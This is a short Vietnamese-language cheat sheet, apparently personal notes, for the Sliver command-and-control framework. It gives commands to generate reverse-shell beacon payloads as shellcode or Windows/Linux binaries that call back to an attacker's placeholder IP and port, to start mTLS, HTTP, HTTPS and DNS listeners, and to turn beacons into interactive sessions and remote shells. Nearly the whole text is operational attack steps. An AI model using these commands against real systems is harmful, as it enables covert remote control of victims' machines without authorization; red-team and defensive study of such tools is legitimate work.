# Sliver

## Setup

### Tạo payload

Sliver chia payload reverse shell thành hai loại chính đó là `Beacon` và `Session` payload

#### Beacon Shellcode

```
sliver > generate beacon --mtls <ip address>:<port> -f shellcode
```

#### Beacon Binary

```
sliver > generate beacon --mtls <ip address>:<port> --os #{os} -f #{file_format}
```

- `os`: windows | linux
- `file_format`: exe | elf

### Stager

**Tại sao phải dùng stager ?**
> Đọc trong [Stager Note](./stager.md) nhé :>

## Exploit

### Tạo Listener

#### MTLS

```bash
sliver > mtls
```

#### HTTP

```bash
sliver > http
```

#### HTTPS

```bash
sliver > https
```

#### DNS

```bash
sliver > dns
```

### Post Exploit

#### Tương tác beacon

```bash
sliver > beacons
sliver > use <beacon_id>
```

### Tạo session từ beacon

```bash
sliver (<beacon_name>) > interactive
sliver (<beacon_name>) > sessions
sliver (<beacon_name>) > use <session_id>
```

### Tạo shell từ session

```bash
sliver (<session_name>) > shell
```
